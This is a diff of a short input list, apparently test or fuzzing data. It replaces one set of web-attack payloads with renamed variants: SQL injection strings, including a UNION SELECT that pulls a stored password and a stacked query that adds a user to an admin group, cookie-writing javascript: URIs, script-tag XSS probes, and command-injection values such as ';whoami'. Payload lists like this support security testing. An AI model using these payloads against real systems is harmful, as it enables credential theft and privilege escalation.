@@ -1,11 +1,11 @@
-84058
-84059-2222
-user=1’
-user=-1+union+select+1,2,3,4,5,6,7,8,9,(SELECT+user_pass+FROM+wp_users+WHERE+ID=1)
-SELECT user_id, username, password_hash FROM users WHERE username = 'john'; INSERT INTO group_membership (user_id, group) VALUES (SELECT user_id FROM users WHERE username='john', 'Administrator'); --'
-javascript:alert("Hello"); alert("World");
-javascript:void(document.cookie="Message=INJECTED");alert(document.cookie);
-<!DOCTYPE html><html><body>This is a basic web page.<script>alert("Look! I made the browser do something.")</script></body></html>
-<script> alert("Look! I made the browser do something."); </script>
-;ls
-./runMyScript.sh
+84102
+84102-5678
+id=7'
+id=-7+union+select+1,2,3,4,5,6,7,8,(SELECT+pwd+FROM+accounts+WHERE+uid=1)
+SELECT acct_id, uname, pwd_hash FROM accounts WHERE uname = 'alice'; INSERT INTO admin_group (acct_id, role) VALUES (SELECT acct_id FROM accounts WHERE uname='alice', 'Owner'); --'
+javascript:alert("Hi"); alert("There");
+javascript:void(document.cookie="Token=STOLEN");alert(document.cookie);
+<!DOCTYPE html><html><body>This is a sample page.<script>alert("Got you!")</script></body></html>
+<script> alert("Got you!"); </script>
+;whoami
+./launchScript.sh
